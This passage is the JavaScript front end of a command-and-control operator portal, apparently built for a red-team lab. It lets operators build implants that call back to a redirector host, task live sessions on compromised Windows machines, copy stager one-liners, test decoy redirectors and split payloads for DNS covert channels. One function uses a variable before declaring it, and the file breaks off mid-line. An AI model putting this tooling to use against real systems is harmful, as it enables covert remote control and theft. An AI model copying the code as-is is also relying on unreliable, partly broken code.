/* ==========================================================================
   C2Stack Flight Control — Interactive Visualizer & Controller Engine
   ========================================================================== */

document.addEventListener('DOMContentLoaded', () => {
  initTabs();
  initStatusHUD();
  initRedirectorVisualizer();
  initDnsDissector();
  initPayloadStudio();
  initFleetRadar();
  initOpsConsole();
});

// ==========================================================================
// 1. Navigation Tabs
// ==========================================================================
function initTabs() {
  const tabBtns = document.querySelectorAll('.tab-btn');
  const tabPanes = document.querySelectorAll('.tab-pane');

  tabBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      const targetTab = btn.getAttribute('data-tab');
      tabBtns.forEach(b => b.classList.remove('active'));
      tabPanes.forEach(p => p.classList.remove('active'));

      btn.classList.add('active');
      const pane = document.getElementById(targetTab);
      if (pane) pane.classList.add('active');
    });
  });
}

// ==========================================================================
// 2. Tab 1: Stack Controller & Health HUD
// ==========================================================================
async function initStatusHUD() {
  const grid = document.getElementById('service-grid');
  const refreshBtn = document.getElementById('refresh-status-btn');

  async function fetchStatus() {
    try {
      const res = await fetch('/api/status');
      const data = await res.json();
      renderServiceGrid(data.services);

      // Update header pills
      const edgePortEl = document.getElementById('edge-port');
      const headerValEl = document.getElementById('header-val');
      if (edgePortEl && data.redirector_http_port) {
        edgePortEl.textContent = `Port ${data.redirector_http_port}`;
      }
      if (headerValEl && data.c2_header) {
        headerValEl.textContent = data.c2_header;
      }
    } catch (err) {
      grid.innerHTML = `<div class="card" style="color:var(--crimson-glow);">Failed to connect to portal API backend: ${err.message}</div>`;
    }
  }

  function renderServiceGrid(services) {
    grid.innerHTML = '';
    for (const [key, svc] of Object.entries(services)) {
      const card = document.createElement('div');
      card.className = 'service-card';

      const isRunning = svc.state === 'running';
      const statusClass = isRunning ? 'running' : 'stopped';
      const statusText = isRunning ? '● RUNNING' : '○ STOPPED';

      let portSummary = [];
      for (const [pname, pval] of Object.entries(svc.ports || {})) {
        if (typeof pval === 'number' || typeof pval === 'string') {
          portSummary.push(`<div class="service-meta-item"><span class="service-meta-label">${pname.toUpperCase()}</span><span>${pval}</span></div>`);
        }
      }

      card.innerHTML = `
        <div class="service-head">
          <div>
            <div class="service-name">${svc.name}</div>
            <div class="service-role">${svc.role}</div>
          </div>
          <span class="status-badge ${statusClass}">${statusText}</span>
        </div>
        <div class="service-meta">
          ${portSummary.join('')}
          ${svc.uri_prefix ? `<div class="service-meta-item"><span class="service-meta-label">PREFIX</span><span>${svc.uri_prefix}</span></div>` : ''}
          <div class="service-meta-item"><span class="service-meta-label">CONTAINER</span><span>${svc.container ? svc.container.id : 'standalone'}</span></div>
        </div>
        <div class="service-actions">
          <button class="btn btn-sm btn-secondary" onclick="viewContainerLogs('${key}')">📄 View Logs</button>
          <button class="btn btn-sm btn-secondary" onclick="restartContainer('${key}')">↻ Restart</button>
        </div>
      `;
      grid.appendChild(card);
    }
  }

  if (refreshBtn) refreshBtn.addEventListener('click', fetchStatus);
  fetchStatus();
}

window.viewContainerLogs = async function(serviceName) {
  const logTitle = document.getElementById('log-service-title');
  const logBody = document.getElementById('service-logs');
  logTitle.textContent = `Active Service Logs [${serviceName}]`;
  logBody.textContent = 'Streaming logs from container socket...';

  try {
    const res = await fetch(`/api/containers/${serviceName}/logs?tail=80`);
    const data = await res.json();
    logBody.textContent = data.logs || 'No recent logs.';
  } catch (err) {
    logBody.textContent = `Error fetching logs: ${err.message}`;
  }
};

window.restartContainer = async function(serviceName) {
  try {
    const res = await fetch(`/api/containers/${serviceName}/action?action=restart`, { method: 'POST' });
    const data = await res.json();
    alert(`Restart command sent to ${serviceName}:\n${data.message || 'OK'}`);
    window.location.reload();
  } catch (err) {
    alert(`Failed to trigger restart: ${err.message}`);
  }
};

// ==========================================================================
// 3. Tab 2: OPSEC Redirector Visualizer
// ==========================================================================
function initRedirectorVisualizer() {
  const pathInput = document.getElementById('sim-path');
  const headerKInput = document.getElementById('sim-header-k');
  const headerVInput = document.getElementById('sim-header-v');
  const testBtn = document.getElementById('btn-fire-test');
  const diagram = document.getElementById('flow-diagram');
  const backendDetail = document.getElementById('backend-route-detail');

  // Presets
  document.getElementById('preset-valid').addEventListener('click', () => {
    pathInput.value = '/gateway/v1/telemetry';
    headerKInput.value = 'X-Request-ID';
    headerVInput.value = 'cadre-c2';
    runTest();
  });

  document.getElementById('preset-scanner').addEventListener('click', () => {
    pathInput.value = '/';
    headerKInput.value = 'User-Agent';
    headerVInput.value = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ThreatHunter/1.0';
    runTest();
  });

  document.getElementById('preset-mismatch').addEventListener('click', () => {
    pathInput.value = '/unknown/admin/login';
    headerKInput.value = 'X-Request-ID';
    headerVInput.value = 'cadre-c2';
    runTest();
  });

  async function runTest() {
    diagram.innerHTML = '<div style="color:var(--text-muted);font-family:var(--font-mono);padding:20px;">Analyzing packet route...</div>';

    const headers = {};
    if (headerKInput.value.trim()) {
      headers[headerKInput.value.trim()] = headerVInput.value.trim();
    }

    try {
      // Real probe: an actual HTTP request through Apache, reporting the real
      // status/byte count and whether the decoy came back. The previous
      // endpoint only simulated the flow and never contacted Apache, so it
      // could "prove" a route was live while it was down.
      const res = await fetch('/api/ops/probe', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          url_path: pathInput.value.trim(),
          headers: headers,
          method: 'POST',
        })
      });
      const data = await res.json();
      renderTrace(opsProbeToTrace(data));
    } catch (err) {
      diagram.innerHTML = `<div style="color:var(--crimson-glow);">Simulation error: ${err.message}</div>`;
    }
  }

  function renderTrace(data) {
    diagram.innerHTML = '';
    const trace = data.trace || [];

    trace.forEach((step, idx) => {
      const nodeEl = document.createElement('div');
      const isShielded = step.status === 'shield_divert' || step.status === 'decoy_served';
      const isVerified = step.status === 'header_verified' || step.status === 'c2_forwarded';

      nodeEl.className = `flow-node ${isVerified ? 'active' : ''} ${isShielded ? 'shielded' : ''}`;
      nodeEl.innerHTML = `
        <div class="flow-node-step">Step ${step.step}</div>
        <div class="flow-node-title">${step.title}</div>
        <div class="flow-node-desc">${step.detail}</div>
      `;
      diagram.appendChild(nodeEl);

      if (idx < trace.length - 1) {
        const arrow = document.createElement('div');
        arrow.className = 'flow-arrow';
        arrow.textContent = '➔';
        diagram.appendChild(arrow);
      }
    });

    if (data.opsec_shielded) {
      backendDetail.innerHTML = `<span style="color:var(--crimson-glow);">[BLOCKED FROM C2 CORE]</span> Traffic diverted to Decoy CDN. Apache returned <strong>${data.http_status}</strong>. Teamserver remained untouched.`;
    } else {
      backendDetail.innerHTML = `<span style="color:var(--green-glow);">[FORWARDED TO ${data.framework ? data.framework.toUpperCase() : 'C2'}]</span> Internal Destination: <code>${data.internal_endpoint}</code> on isolated network <code>c2_core</code>.`;
    }
  }

  if (testBtn) testBtn.addEventListener('click', runTest);
  runTest();
}

// ==========================================================================
// 4. Tab 3: DNS Covert Dissector
// ==========================================================================
function initDnsDissector() {
  const payloadInput = document.getElementById('dns-payload-input');
  const sessionInput = document.getElementById('dns-session-input');
  const domainInput = document.getElementById('dns-domain-input');
  const btn = document.getElementById('btn-dissect-dns');

  const metricBytes = document.getElementById('metric-bytes');
  const metricB32 = document.getElementById('metric-b32');
  const metricPackets = document.getElementById('metric-packets');
  const metricCrypto = document.getElementById('metric-crypto');
  const tbody = document.getElementById('dns-packet-tbody');
  const eduList = document.getElementById('dns-edu-notes');

  async function runDissection() {
    try {
      const res = await fetch('/api/dns/dissect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          payload_text: payloadInput.value.trim() || 'whoami /priv',
          session_id: sessionInput.value.trim() || 'A3F99B',
          domain_suffix: domainInput.value.trim() || 'c2.cadre.local',
        })
      });
      const data = await res.json();
      renderDissection(data);
    } catch (err) {
      alert(`DNS Dissection error: ${err.message}`);
    }
  }

  function renderDissection(data) {
    metricBytes.textContent = `${data.byte_length} bytes`;
    metricB32.textContent = `${data.base32_length} chars`;
    metricPackets.textContent = `${data.total_packets} packet${data.total_packets > 1 ? 's' : ''}`;
    metricCrypto.textContent = 'X25519 + AES-GCM';

    tbody.innerHTML = '';
    data.packets.forEach(pkt => {
      const tr = document.createElement('tr');
      tr.innerHTML = `
        <td><span class="status-badge running">#${pkt.sequence}/${pkt.total}</span></td>
        <td><span class="query-fqdn">${pkt.generated_query}</span></td>
        <td>${pkt.chunk_len}B / 36B</td>
        <td><span style="color:var(--green-glow);">✓ Label Safe (&lt;63B)</span></td>
        <td><button class="btn btn-sm btn-secondary" onclick="navigator.clipboard.writeText('${pkt.generated_query}')">📋 Copy FQDN</button></td>
      `;
      tbody.appendChild(tr);
    });

    eduList.innerHTML = '';
    (data.educational_notes || []).forEach(note => {
      const li = document.createElement('li');
      li.textContent = note;
      eduList.appendChild(li);
    });
  }

  if (btn) btn.addEventListener('click', runDissection);
  runDissection();
}

// ==========================================================================
// 5. Tab 4: Payload Studio
// ==========================================================================
async function initPayloadStudio() {
  const fwButtons = document.querySelectorAll('.fw-nav-btn');
  const fwName = document.getElementById('fw-name');
  const fwDesc = document.getElementById('fw-desc');
  const stagersList = document.getElementById('stagers-list');
  const detectionBox = document.getElementById('detection-box');

  let payloadsData = {};
  try {
    const res = await fetch('/api/payloads');
    payloadsData = await res.json();
  } catch (err) {
    console.error('Failed to load payload studio templates', err);
  }

  function selectFramework(fwKey) {
    fwButtons.forEach(b => b.classList.remove('active'));
    const activeBtn = document.querySelector(`.fw-nav-btn[data-fw="${fwKey}"]`);
    if (activeBtn) activeBtn.classList.add('active');

    const profile = payloadsData[fwKey];
    if (!profile) return;

    fwName.textContent = profile.name;
    fwDesc.textContent = profile.description;

    stagersList.innerHTML = '';
    for (const [stitle, scode] of Object.entries(profile.stagers || {})) {
      const scard = document.createElement('div');
      scard.className = 'stager-card';
      scard.innerHTML = `
        <div class="stager-header">
          <span class="stager-title">${stitle.replace('_', ' ').toUpperCase()}</span>
          <button class="btn btn-sm btn-secondary" onclick="navigator.clipboard.writeText(this.getAttribute('data-code'))" data-code="${scode}">📋 Copy One-Liner</button>
        </div>
        <div class="stager-code">${scode}</div>
      `;
      stagersList.appendChild(scard);
    }

    const d = profile.detection || {};
    detectionBox.innerHTML = `
      <div><strong>Network Artifacts:</strong> <span style="color:var(--text-secondary);">${d.network || 'Standard C2 protocol'}</span></div>
      <div><strong>Host Indicators:</strong> <span style="color:var(--text-secondary);">${d.host || 'Process memory allocation'}</span></div>
      <div><strong>Key Security Events:</strong> ${(d.event_ids || []).map(e => `<span class="status-badge running" style="margin-right:6px;">${e}</span>`).join('')}</div>
    `;
  }

  fwButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      selectFramework(btn.getAttribute('data-fw'));
    });
  });

  // Default to meridian
  selectFramework('meridian');
}

// ==========================================================================
// 6. Tab 5: Fleet Radar
// ==========================================================================
async function initFleetRadar() {
  const tbody = document.getElementById('fleet-tbody');

  async function fetchFleet() {
    try {
      // /api/ops/sessions queries every framework readable headlessly and
      // reports each backend's status separately. The old /api/sessions only
      // knew Mythic + Meridian and invented hosts when they were unreachable.
      const res = await fetch('/api/ops/sessions');
      const down = Object.entries(data.backends || {})
        .filter(([, v]) => !v.ok)
        .map(([k, v]) => k + ': ' + (v.error || 'unreachable'));
      if (!(data.sessions || []).length && !down.length) {
        tbody.innerHTML = '<tr><td colspan=\"7\" class=\"empty-row\">' +
          'All backends answered and none reported a live session.</td></tr>';
      }
      const data = await res.json();
      tbody.innerHTML = '';
      (data.sessions || []).forEach(sess => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
          <td><code>${sess.id}</code></td>
          <td><strong style="color:var(--crimson-glow);">${sess.backend.toUpperCase()}</strong></td>
          <td>${sess.hostname}</td>
          <td><code>${sess.username}</code></td>
          <td>${sess.transport}</td>
          <td>${(sess.process || sess.pid) ? (sess.process || '') + ' pid ' + (sess.pid || '?') : '-'}</td>
          <td><span class="status-badge running">● ALIVE</span></td>
        `;
        tbody.appendChild(tr);
      });

      // A backend that failed is rendered as a row rather than silently
      // omitted, so "no such backend" is never mistaken for "no agents".
      down.forEach(msg => {
        const tr = document.createElement('tr');
        tr.innerHTML = '<td colspan="7" style="color:var(--crimson-glow);">' +
          'backend unavailable - ' + msg + '</td>';
        tbody.appendChild(tr);
      });
    } catch (err) {
      tbody.innerHTML = `<tr><td colspan="7" style="color:var(--crimson-glow);">Error loading fleet sessions: ${err.message}</td></tr>`;
    }
  }

  fetchFleet();
}

/* ==========================================================================
   7. Tab 6: Operations Console - live sessions and real tasking
   --------------------------------------------------------------------------
   Every value rendered here comes from a live backend query. A backend that is
   unreachable is rendered as an explicit error on its own chip; it is never
   replaced with placeholder sessions, because an invented session list is
   indistinguishable from a real one at a glance.
   ========================================================================== */

// Native command syntax differs per framework. Feeding `whoami` to Adaptix or
// Havoc's dispatcher produces an "unknown command" error, so the presets are
// built from what each framework actually accepts.
const OPS_PRESETS = {
  meridian: ['whoami', 'ipconfig /all', 'net user', 'whoami > C:\\Users\\vagrant\\out.txt'],
  mythic:   ['whoami', 'ipconfig /all', 'net user', 'whoami > C:\\Users\\vagrant\\out.txt'],
  havoc:    ['whoami', 'shell whoami', 'powershell Get-Process', 'ls C:\\',
             'ps', 'cat C:\\Windows\\System32\\drivers\\etc\\hosts',
             'sleep 10', 'token list', 'net domain', 'config Sleep',
             'whoami > C:\\Users\\vagrant\\out.txt'],
  adaptix:  ['getuid', 'ls C:\\Users\\vagrant', 'ps list',
             'shell whoami', 'powershell whoami /priv',
             'shell whoami > C:\\Users\\vagrant\\out.txt'],
  // Sliver `execute` runs the binary directly with no shell: no `>`, `|`,
  // `&&`. `whoami /priv` passes /priv as an argument (harmless); shell
  // features need an explicit wrapper, hence the cmd.exe preset.
  sliver:   ['whoami', 'hostname', 'ipconfig',
             'cmd.exe "/c whoami > C:\\Users\\vagrant\\out.txt"'],
};

let opsSessions = [];
let opsSelected = null;
let opsTimer = null;

function opsSetOutput(text, cls) {
  const el = document.getElementById('ops-output');
  el.textContent = text;
  el.className = 'ops-output' + (cls ? ' ' + cls : '');
}

function opsRenderChips(backends) {
  const wrap = document.getElementById('backend-chips');
  wrap.innerHTML = '';
  const order = ['mythic', 'meridian', 'havoc', 'adaptix', 'sliver'];
  order.forEach(name => {
    const info = backends[name];
    const chip = document.createElement('div');
    if (!info) {
      chip.className = 'backend-chip down';
      chip.innerHTML = '<span class="dot"></span><span class="name">' +
        name + '</span><span class="detail">not reported</span>';
    } else if (info.ok) {
      chip.className = 'backend-chip ok';
      chip.innerHTML = '<span class="dot"></span><span class="name">' + name +
        '</span><span class="detail">' + (info.count || 0) + ' session(s)</span>';
    } else {
      chip.className = 'backend-chip down';
      chip.innerHTML = '<span class="dot"></span><span class="name">' + name +
        '</span><span class="detail" title="' + (info.error || '').replace(/"/g, '&quot;') +
        '">' + (info.error || 'unreachable') + '</span>';
    }
    wrap.appendChild(chip);
  });
}

function opsRenderSessions(sessions) {
  const tbody = document.getElementById('ops-tbody');
  document.getElementById('ops-count').textContent = sessions.length;
  tbody.innerHTML = '';
  if (!sessions.length) {
    tbody.innerHTML = '<tr><td colspan="5" class="empty-row">' +
      'No live sessions. Every backend answered, or reported its own error above.</td></tr>';
    return;
  }
  sessions.forEach(s => {
    const tr = document.createElement('tr');
    if (opsSelected && opsSelected.backend === s.backend &&
        String(opsSelected.id) === String(s.id)) {
      tr.className = 'selected';
    }
    // Meridian records no process name (only a pid), so fall back to the pid
    // rather than rendering a bare "?".
    const proc = [s.process, s.pid ? 'pid ' + s.pid : ''].filter(Boolean).join(' / ') || '—';
    tr.innerHTML =
      '<td><span class="fw-tag">' + (s.backend || '?').toUpperCase() + '</span></td>' +
      '<td>' + (s.hostname || '?') + (s.transport ? ' <small>(' + s.transport + ')</small>' : '') + '</td>' +
      '<td><code>' + (s.username || '?') + '</code></td>' +
      '<td><code>' + (proc || '?') + '</code></td>' +
      '<td><button class="btn btn-outline-success btn-sm">Select</button></td>';
    tr.querySelector('button').addEventListener('click', () => opsSelect(s, tr));
    tbody.appendChild(tr);
  });
}

function opsSelect(session, row) {
  opsSelected = session;
  document.querySelectorAll('#ops-tbody tr').forEach(r => r.classList.remove('selected'));
  if (row) row.classList.add('selected');

  const target = document.getElementById('ops-target');
  target.className = 'ops-target';
  target.innerHTML = '<span class="fw-tag">' + session.backend.toUpperCase() +
    '</span><strong>' + (session.hostname || '?') + '</strong> &middot; ' +
    (session.username || '?') +
    (session.process ? ' &middot; ' + session.process : '') +
    '<br><small>session id: ' + session.id + '</small>';

  // Presets are framework-specific; showing another framework's syntax would
  // just produce "unknown command" errors. The live catalogue
  // (/api/ops/catalogues) wins when loaded; the static list is the fallback.
  opsRenderPresets(session.backend);

  opsSetOutput('Session selected. Enter a command and press Execute.', '');
}

let opsCatalogues = null;
async function opsLoadCatalogues() {
  if (opsCatalogues) return opsCatalogues;
  try {
    const res = await fetch('/api/ops/catalogues');
    if (res.ok) opsCatalogues = await res.json();
  } catch (err) {
    opsCatalogues = null;
  }
  return opsCatalogues;
}

function opsRenderPresets(backend) {
  const presets = document.getElementById('ops-presets');
  presets.innerHTML = '';
  // Each preset is {cmd, label, title}: clicking fills cmd, hovering shows
  // the help text. Catalogue entries without examples (havoc) show the bare
  // command with its help as the tooltip.
  let items = (OPS_PRESETS[backend] || OPS_PRESETS.mythic).map(cmd => ({
    cmd: cmd, label: cmd, title: cmd,
  }));
  if (opsCatalogues && opsCatalogues[backend]) {
    const cat = opsCatalogues[backend];
    items = Object.entries(cat).map(([name, spec]) => ({
      cmd: spec.example || name,
      label: spec.example || name,
      title: (spec.example ? spec.example + '\n' : name + '\n') + spec.help,
    }));
  }
  items.forEach(({cmd, label, title}) => {
    const b = document.createElement('button');
    b.textContent = label.length > 42 ? label.slice(0, 42) + '…' : label;
    b.title = title;
    b.addEventListener('click', () => {
      document.getElementById('ops-command').value = cmd;
    });
    presets.appendChild(b);
  });
}

async function opsRefresh() {
  const btn = document.getElementById('ops-refresh');
  btn.disabled = true;
  btn.textContent = '… querying backends';
  try {
    const res = await fetch('/api/ops/sessions');
    if (!res.ok) throw new Error('HTTP ' + res.status);
    const data = await res.json();
    opsSessions = data.sessions || [];
    opsRenderChips(data.backends || {});
    opsRenderSessions(opsSessions);
  } catch (err) {
    opsRenderChips({});
    opsSetOutput('Could not reach the portal API: ' + err.message, 'err');
  } finally {
    btn.disabled = false;
    btn.textContent = '↻ Refresh Sessions';
  }
}

async function opsRunTask() {
  if (!opsSelected) {
    opsSetOutput('Select a session first.', 'err');
    return;
  }
  const cmd = document.getElementById('ops-command').value.trim();
  if (!cmd) {
    opsSetOutput('Enter a command.', 'err');
    return;
  }
  const meta = document.getElementById('ops-output-meta');
  const runBtn = document.getElementById('ops-run');
  runBtn.disabled = true;
  meta.textContent = 'tasking…';
  opsSetOutput('Sending to ' + opsSelected.backend + ' (' + opsSelected.id + ')…\n$ ' + cmd, 'busy');

  // Havoc `upload <remote-path>` needs the file bytes: attach the staged
  // file automatically when the command calls for it.
  let upload_data_b64 = null;
  if (opsSelected.backend === 'havoc' && /^upload\s+\S/.test(cmd)) {
    if (!opsStagedFile) {
      opsSetOutput('Stage a file first (Payload Builds → Stage operator file).', 'err');
      runBtn.disabled = false;
      meta.textContent = '';
      return;
    }
    upload_data_b64 = opsStagedFile.b64;
  }
  try {
    const res = await fetch('/api/ops/task', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        backend: opsSelected.backend,
        session_id: String(opsSelected.id),
        command: cmd,
        wait: 25,
        upload_data_b64: upload_data_b64,
      }),
    });
    const data = await res.json();
    if (!res.ok) {
      opsSetOutput('Task failed: ' + (data.detail || res.statusText), 'err');
      meta.textContent = '';
      return;
    }
    opsShowResult(opsSelected.backend, data);
  } catch (err) {
    opsSetOutput('Request failed: ' + err.message, 'err');
  } finally {
    runBtn.disabled = false;
    meta.textContent = '';
  }
}

// Each backend returns task output in a different shape; normalise them so the
// console shows the command's actual stdout instead of a JSON envelope.
function opsShowResult(backend, data) {
  const meta = document.getElementById('ops-output-meta');
  let text = '';

  if (backend === 'havoc') {
    const r = data.result || {};
    if ((r.errors || []).length) {
      text = (r.errors || []).join('\n');
    } else {
      text = r.output || '(no output returned)';
    }
    meta.textContent = 'task ' + (r.task_id || '') + ' · ' + (r.raw_chunks || 0) + ' frames';
  } else if (backend === 'adaptix') {
    const tasks = data.results || [];
    const withOutput = tasks.filter(t => t.a_text && t.a_text.trim());
    if (withOutput.length) {
      text = withOutput.slice(-3).map(t =>
        '$ ' + (t.a_cmdline || '') + '\n' + t.a_text).join('\n\n');
    } else {
      const r = data.result || {};
      text = r.message || '(queued; output appears once the agent completes the task)';
    }
    meta.textContent = tasks.length + ' completed task(s)';
  } else if (backend === 'mythic') {
    const r = data.result || {};
    // Output comes from the response table (task.stdout never carries it
    // in this stack). Falls back to the raw envelope while polling.
    text = r.output || JSON.stringify(data.result, null, 2);
    meta.textContent = 'task ' + (r.id || r.display_id || '');
  } else if (backend === 'meridian') {
    text = typeof data.result === 'string' ? data.result : JSON.stringify(data.result, null, 2);
    meta.textContent = 'queued (read output from the meridian results table)';
  } else if (backend === 'sliver') {
    const r = data.result || {};
    if (r.async && r.queued) {
      // Beacon task: queued, executes on next checkin. States poll at
      // /api/ops/sliver/tasks?beacon_id=… (result text stays console-only).
      text = 'Beacon task queued: ' + r.queued +
        '\nExecutes on next checkin (~60s). States: GET /api/ops/sliver/tasks?beacon_id=' +
        (r.session_id || '');
      meta.textContent = 'beacon ' + (r.session_id || '') + ' (async)';
    } else {
      text = r.output || (r.ok === false ? (r.raw || 'task failed') : '(no output returned)');
      meta.textContent = 'session ' + (r.session_id || '');
    }
  } else {
    text = JSON.stringify(data, null, 2);
  }
  opsSetOutput(text, text.startsWith('(no output') ? '' : '');
}

async function opsRunBuild() {
  const fw = document.getElementById('build-fw').value;
  const out = document.getElementById('build-output');
  const btn = document.getElementById('build-run');
  const arch = document.getElementById('build-arch').value;
  const fmt = document.getElementById('build-fmt').value;
  const sleep = document.getElementById('build-sleep').value;

  btn.disabled = true;
  out.className = 'ops-output build-out busy';
  out.textContent = (fw === 'havoc'
    ? 'Havoc compiles Demon payloads server-side; the first build can take '
      + '30-90s while the mingw cross-gcc runs.\n\n'
    : 'Adaptix compiles the beacon server-side with mingw g++.\n\n')
    + 'building…';

  // Victim-facing redirector IP for implant callback URLs (env-driven;
  // falls back to the lab default if /api/status is unreachable).
  let victimIp = '192.168.77.1';
  try {
    const st = await fetch('/api/status');
    if (st.ok) {
      const sj = await st.json();
      if (sj.victim_redirector_ip) victimIp = sj.victim_redirector_ip;
    }
  } catch (err) { /* keep default */ }

  try {
    if (fw === 'mythic') {
      await opsRunMythicBuild(out, btn);
      return;
    }
    let url, body;
    if (fw === 'adaptix') {
      url = '/api/ops/adaptix/agent';
      body = { agent: 'beacon', listener: 'cadre_http', arch: arch,
               format: fmt, sleep: sleep, jitter: 0 };
    } else if (fw === 'sliver') {
      url = '/api/ops/sliver/generate';
      body = { kind: 'session', c2_url: victimIp + ':80/cloud/storage/objects',
               target_os: 'windows', arch: 'amd64' };
      out.textContent = 'Sliver compiles with garble (~40s warm, minutes cold).\n\nbuilding…';
    } else {
      url = '/api/ops/havoc/build';
      body = { arch: arch, format: 'Windows Exe' };
    }
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    const data = await res.json();
    if (!res.ok) {
      out.className = 'ops-output build-out err';
      out.textContent = 'Build failed: ' + (data.detail || res.statusText);
      return;
    }
    out.className = 'ops-output build-out';
    if (fw === 'sliver') {
      // 48 MB binaries stay server-side; the operator fetches with docker cp.
      out.textContent = 'Sliver ' + (data.kind || '') + ' implant built.\n' +
        'Container path: ' + (data.container_path || '') + '\n' +
        'Retrieve with: ' + (data.retrieve || '') + '\n\n' +
        (data.log || '');
      return;
    }
    const b64 = data.base64 || '';
    const head = (data.filename || 'payload') + ' — ' + (data.size || 0) + ' bytes\n';
    const link = b64
      ? 'Download: data:application/octet-stream;base64,' + b64.slice(0, 40) +
        '… (full payload below)\n\n'
      : '';
    const console_ = (data.console || []).join('\n');
    out.textContent = head + link +
      (b64 ? '\nbase64 payload (' + b64.length + ' chars):\n' + b64 : '') +
      (console_ ? '\n\nBuild log:\n' + console_ : '');
  } catch (err) {
    out.className = 'ops-output build-out err';
    out.textContent = 'Request failed: ' + err.message;
  } finally {
    btn.disabled = false;
  }
}

// Mythic/Apollo builds take minutes (dotnet), so submit returns a uuid
// immediately and the UI polls the phase, then offers the in-portal download.
async function opsRunMythicBuild(out, btn) {
  const output_type = document.getElementById('build-moutput').value;
  const debug = document.getElementById('build-mdebug').value === 'true';
  const keying = document.getElementById('build-mkeying').value.trim();
  const body = { output_type: output_type, debug: debug };
  if (keying) {
    const parts = keying.split(':');
    if (parts.length !== 2 || !parts[0] || !parts[1]) {
      out.className = 'ops-output build-out err';
      out.textContent = 'Keying must look like Hostname:WS01 or Domain:CHILD.';
      btn.disabled = false;
      return;
    }
    body.enable_keying = true;
    body.keying_method = parts[0];
    body.keying_value = parts[1];
  }
  out.className = 'ops-output build-out busy';
  out.textContent = 'Submitting Apollo ' + output_type + ' build…';
  try {
    const sub = await fetch('/api/ops/mythic/build', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    const sj = await sub.json();
    if (!sub.ok) {
      out.className = 'ops-output build-out err';
      out.textContent = 'Submit failed: ' + (sj.detail || sub.statusText);
      btn.disabled = false;
      return;
    }
    const uuid = sj.uuid;
    out.textContent = 'Build queued: ' + uuid + '\ndotnet takes minutes — polling…';
    for (let i = 0; i < 40; i++) {
      await new Promise(r => setTimeout(r, 15000));
      const st = await fetch('/api/ops/mythic/build/' + uuid);
      const sj2 = await st.json();
      if (!st.ok) {
        out.textContent = 'Status error: ' + (sj2.detail || st.statusText);
        break;
      }
      if (sj2.phase === 'success') {
        out.className = 'ops-output build-out';
        out.innerHTML = '';
        out.appendChild(document.createTextNode(
          'Apollo ' + output_type + ' built.\n'));
        const a = document.createElement('a');
        a.href = sj2.download_url;
        a.textContent = '⬇ Download payload (' + uuid + ')';
        a.className = 'btn btn-primary';
        out.appendChild(a);
        break;
      }
      if (sj2.phase === 'error') {
        out.className = 'ops-output build-out err';
        out.textContent = 'Build failed:\n' + (sj2.message || '') + '\n' +
          (sj2.stderr || '').slice(-1500);
        break;
      }
      out.textContent = 'Build ' + sj2.phase + '… (' + (i + 1) +
        '/40 polls)\n' + (sj2.message || '');
    }
  } catch (err) {
    out.className = 'ops-output build-out err';
    out.textContent = 'Request failed: ' + err.message;
  } finally {
    btn.disabled = false;
  }
}

function initOpsConsole() {
  // Load the tasking vocabularies in the background; preset buttons upgrade
  // to catalogue examples (with help text) once it arrives.
  opsLoadCatalogues().then(() => {
    if (opsSelected) opsRenderPresets(opsSelected.backend);
  });
  document.getElementById('ops-refresh').addEventListener('click', opsRefresh);
  document.getElementById('ops-run').addEventListener('click', opsRunTask);
  document.getElementById('build-run').addEventListener('click', opsRunBuild);
  document.getElementById('ops-command').addEventListener('keydown', e => {
    if (e.key === 'Enter') opsRunTask();
  });
  document.getElementById('ops-auto').addEventListener('change', e => {
    if (opsTimer) { clearInterval(opsTimer); opsTimer = null; }
    if (e.target.checked) opsTimer = setInterval(opsRefresh, 15000);
  });

  // Per-framework build forms share one row: Havoc needs neither format nor
  // sleep; Mythic/Apollo needs its own output/debug/keying fields instead of
  // arch/format/sleep (arch is always x64 Windows for Apollo here).
  document.getElementById('build-fw').addEventListener('change', e => {
    const fw = e.target.value;
    const hav = fw === 'havoc';
    const slv = fw === 'sliver';
    const myt = fw === 'mythic';
    document.getElementById('build-fmt-wrap').style.display =
      (hav || myt) ? 'none' : '';
    const sleep = document.getElementById('build-sleep');
    document.getElementById('build-sleep-wrap').style.display =
      (hav || slv || myt) ? 'none' : '';
    if (hav) sleep.value = '';
    document.getElementById('build-arch-wrap').style.display =
      myt ? 'none' : '';
    for (const id of ['build-moutput-wrap', 'build-mdebug-wrap',
                      'build-mkeying-wrap']) {
      document.getElementById(id).style.display = myt ? '' : 'none';
    }
  });
  document.getElementById('stage-run').addEventListener('click', opsStageFile);
}

// Staged operator file: uploaded to Mythic once (returns agent_file_id for
// register_coff flows) and ALSO held in memory so Havoc `upload <path>`
// tasks can attach the bytes (upload_data_b64).
let opsStagedFile = null;

async function opsStageFile() {
  const input = document.getElementById('stage-file');
  const status = document.getElementById('stage-status');
  const out = document.getElementById('build-output');
  if (!input.files || !input.files.length) {
    status.textContent = 'Pick a file first.';
    return;
  }
  const file = input.files[0];
  const buf = new Uint8Array(await file.arrayBuffer());
  let b64 = '';
  for (let i = 0; i < buf.length; i += 0x8000) {
    b64 += String.fromCharCode.apply(null, buf.subarray(i, i + 0x8000));
  }
  b64 = btoa(b64);
  opsStagedFile = { name: file.name, size: file.size, b64: b64 };
  status.textContent = 'Staged locally: ' + file.name + ' (' + file.size +
    ' B). Uploading to Mythic…';
  try {
    const fd = new FormData();
    fd.append('file', new Blob([buf]), file.name);
    const res = await fetch('/api/ops/mythic/upload', {
      method: 'POST', body: fd,
    });
    const data = await res.json();
    if (!res.ok) {
      status.textContent = 'Local only (' + file.name + '): Mythic upload failed: ' +
        (data.detail || res.statusText);
      return;
    }
    opsStagedFile.agent_file_id = data.agent_file_id;
    status.textContent = 'Staged: ' + file.name + ' (' + file.size +
      ' B) → Mythic agent_file_id ' + data.agent_file_id +
      '. Use register_file with this name, then execute_coff.';
    out.className = 'ops-output build-out';
    out.textContent = 'Staged ' + file.name + ' in Mythic.\nagent_file_id: ' +
      data.agent_file_id + '\nNext: register_file {"existingFile": "' +
